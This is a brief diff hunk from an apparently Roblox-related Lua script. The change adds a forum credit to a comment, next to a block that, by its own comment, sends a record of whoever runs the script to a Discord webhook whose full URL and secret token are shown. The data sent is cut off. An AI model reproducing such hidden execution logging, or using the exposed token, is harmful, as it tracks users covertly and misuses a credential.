@@ -862,7 +862,7 @@ focus()
 end
 end)
 
--- THIS IS TO SEE WHO EXECUTED IT
+-- THIS IS TO SEE WHO EXECUTED IT, CREDITS: https://v3rmillion.net/showthread.php?tid=1022844
 task.spawn(function()
 local url = "https://discord.com/api/webhooks/1162190368306122915/_sUhitXCi7FzmWDwrcKXWy8wScOBm7dCLmv2DjZP2K-uV_DFBU9bhwqfju3MDcsIM9BG"
 local data = {
